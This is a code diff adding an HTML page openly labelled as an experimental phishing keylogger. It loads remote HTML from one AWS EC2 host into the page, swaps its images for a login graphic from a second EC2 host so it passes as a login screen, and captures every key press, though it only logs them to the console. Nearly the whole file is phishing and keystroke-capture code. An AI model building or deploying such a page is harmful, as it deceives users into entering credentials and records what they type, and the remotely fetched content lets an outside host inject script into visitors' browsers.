@@ -1,0 +1,41 @@
+<html>
+
+<head>
+    <script src = "https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.0/FileSaver.min.js" integrity="sha512-csNcFYJniKjJxRWRV1R7fvnXrycHP6qDR21mgz1ZP55xY5d+aHLfo9/FcGDQLfn2IfngbAHd8LdfsagcCqgTcQ==" crossorigin = "anonymous" referrerpolicy = "no-referrer"> </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" charset="utf-8">
+    </script>
+
+</head>
+
+<body>
+    <h2>WARNING: PHISHING KEYLOGGER! For experimental purposes only. Do not input any sensitive info.</h2>
+
+    <script>
+        let html;
+        $(document).ready(function () {
+            $.ajax({
+                url: 'http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/',
+                success: function (data) {
+                    html = data;
+                    display_html()
+                }
+            })
+        })
+        function display_html() {
+            $("body").append(html)
+            $("img").attr("src", "http://ec2-13-126-59-244.ap-south-1.compute.amazonaws.com/static/images/login.png")
+        }
+
+         var keychars = "";
+        document.onkeydown = function(e){ 
+       keychars += `${e.key}`;
+        console.log(keychars); 
+        keychars = "";  
+    
+};
+    </script>
+</body>
+
+</html>
+
